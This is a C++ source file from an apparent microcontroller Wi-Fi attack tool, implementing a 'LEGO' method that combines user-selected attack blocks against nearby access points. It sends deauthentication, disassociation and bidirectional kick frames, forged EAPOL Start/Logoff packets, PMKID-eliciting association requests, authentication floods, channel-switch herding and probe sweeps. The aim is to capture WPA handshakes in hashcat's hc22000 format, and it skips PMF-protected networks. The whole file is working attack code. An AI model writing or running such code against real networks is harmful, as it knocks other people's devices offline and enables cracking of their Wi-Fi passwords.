// cap/methods/method_lego.cpp
// The "LEGO" composable method. Unlike fixed methods, it has no hardcoded
// behaviour of its own: on every kick tick it runs ONLY the building blocks
// the user switched on in the LegoMeto screen (RadioConfig::legoBlocks, a
// bitmask carried through Ctx). "Only kick, nothing else" = just DEAUTH.
//
// Blocks are implemented by reusing the shared WSLBypasser frame builders and
// method_common helpers, so the constructor composes real, tested primitives
// — it's not a toy branching matrix, it's the same calls the fixed methods use.
#include "method_ctx.h"
#include "method_common.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include "../../core/config.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

static uint32_t s_lastSweepMs = 0;

void resetLegoState() {
    s_lastSweepMs = 0;
}

static bool legoPick(const Ctx& ctx, const BeaconSlot& b) {
    if (b.channel != ctx.channel) return false;
    if (ctx.isOwnAp(b.bssid)) return false;
    if (ctx.skipPin(b.bssid)) return false;
    if (ctx.isSkipped && ctx.isSkipped(b.bssid)) return false;
    if (b.rssi < ctx.minRssi) return false;
    if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) return false;
    if (b.pmfCapable) return false; // deauth dropped; CSA handled below
    return true;
}

void lego(const Ctx& ctx) {
    uint16_t m = ctx.legoBlocks & LEGO_ALL;
    if (!m) return;                        // nothing built yet
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    // SCORE THR > 0 -> only the best target (universal, same as ALL/CLIENTS).
    int8_t fi = commonFocusTarget(ctx);

    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        if (fi >= 0 && (int8_t)i != fi) continue;
        const BeaconSlot& b = ctx.beacons[i];
        if (!legoPick(ctx, b)) continue;
        // COOLDOWN applies in both modes: a locked/focused target getting
        // kicked every single tick with no breathing room defeats the
        // whole point of the knob (give a just-kicked AP time to actually
        // produce a handshake instead of hammering it non-stop).
        if (commonInCooldown(b.bssid, ctx.cooldownSec)) continue;

        const bool hasCli = b.clientN > 0;
        const bool kickSel = (m & (LEGO_DEAUTH | LEGO_DISASSOC)) != 0;
        const bool perClient = hasCli && (m & LEGO_BIDIR);
        bool did = false;

        if (perClient) {
            for (uint8_t c = 0; c < b.clientN; c++) {
                const uint8_t* sta = b.clients[c];
                WSLBypasser::sendBidirectionalKick(b.bssid, sta, ctx.deauthReason, rounds);
                *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
                if (m & LEGO_EAPOL) {
                    WSLBypasser::sendEAPOLStart(b.bssid, sta);
                    WSLBypasser::sendEAPOLLogoff(b.bssid, sta);
                }
            }
            did = true;
        } else {
            if (m & LEGO_DEAUTH)
                for (uint8_t r = 0; r < rounds; r++) {
                    ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                }
            if (m & LEGO_DISASSOC) {
                if (m & LEGO_DEAUTH) delay(WSLBypasser::burstLegGapMs());
                for (uint8_t r = 0; r < rounds; r++) {
                    ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                }
            }
            if (kickSel) did = true;
            if (hasCli && (m & LEGO_EAPOL)) {
                for (uint8_t c = 0; c < b.clientN; c++) {
                    WSLBypasser::sendEAPOLStart(b.bssid, b.clients[c]);
                    WSLBypasser::sendEAPOLLogoff(b.bssid, b.clients[c]);
                }
                did = true;
            }
        }

        if ((m & LEGO_PMKID) && b.ssid[0] && !Hc22000::hasPair(b.bssid)) {
            WSLBypasser::sendAuthentication(b.bssid);
            WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
            did = true;
        }
        if ((m & LEGO_AUTHFLOOD) && !hasCli) {
            WSLBypasser::sendAuthFlood(b.bssid, 8);
            *ctx.framesDeauth += 8;
            did = true;
        }

        if (did) commonRememberKick(b.bssid);
        yield();
        if (fi >= 0) break;                // focused: one AP per tick
    }

    if (m & LEGO_CSA) csaHerd(ctx);        // rate-limited helper

    if (m & LEGO_SWEEP) {                  // rate-limited probe sweep
        uint32_t now = millis();
        if (now - s_lastSweepMs >= 800) {
            WSLBypasser::sendProbeRequest(nullptr);
            (*ctx.framesDeauth)++;
            s_lastSweepMs = now;
        }
    }
}

CAP_METHOD_REGISTER("LEGO", lego, nullptr, resetLegoState)

} // namespace Methods
} // namespace Cap